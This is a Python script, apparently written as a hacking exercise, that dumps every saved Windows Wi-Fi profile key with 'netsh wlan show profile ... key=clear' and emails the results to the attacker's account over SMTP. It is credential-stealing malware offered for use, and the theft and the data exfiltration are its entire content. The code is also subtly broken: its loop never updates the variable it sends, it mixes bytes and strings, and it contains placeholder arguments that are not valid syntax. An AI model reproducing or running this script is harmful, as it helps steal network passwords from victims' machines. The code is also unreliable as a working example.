#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 27-06-2020
# Last Updated: 04-07-2020
# Operating System: Windows
# Description: Steals Wi-Fi passwords stored on a target system and returns them to the hacker's mail id.

# Import necessary packages
import subprocess, smtplib, re


# Define a function that sends an email
def send_mail(email_id, passwd, msg):
    # Create an instance of the SMTP server (here, a gmail SMTP server is created)
    server = smtplib.SMTP("smtp-mail.gmail.com", 587)
    # Initiate a TLS connection using the created server
    server.starttls()
    # Login to your gmail address
    server.login(email_id, passwd)
    # Send the mail (sender_id, receiver_id, message)
    server.sendmail(email_id, email_id, msg)
    # Quit the server
    server.quit()


# Insert the commands
command = "netsh wlan show profile"
networks =  subprocess.check_output(command, shell=True)
# Search for all the connected networks
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

network_details = ""
# Iterate over the list to get credentials of each of the network
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_network_details = subprocess.check_output(command, shell=True)
    result = network_details + current_network_details

# Send the details to the e-mail
send_mail(<YOUR_EMAIL_ADDRESS>, <PASSWORD>, network_details)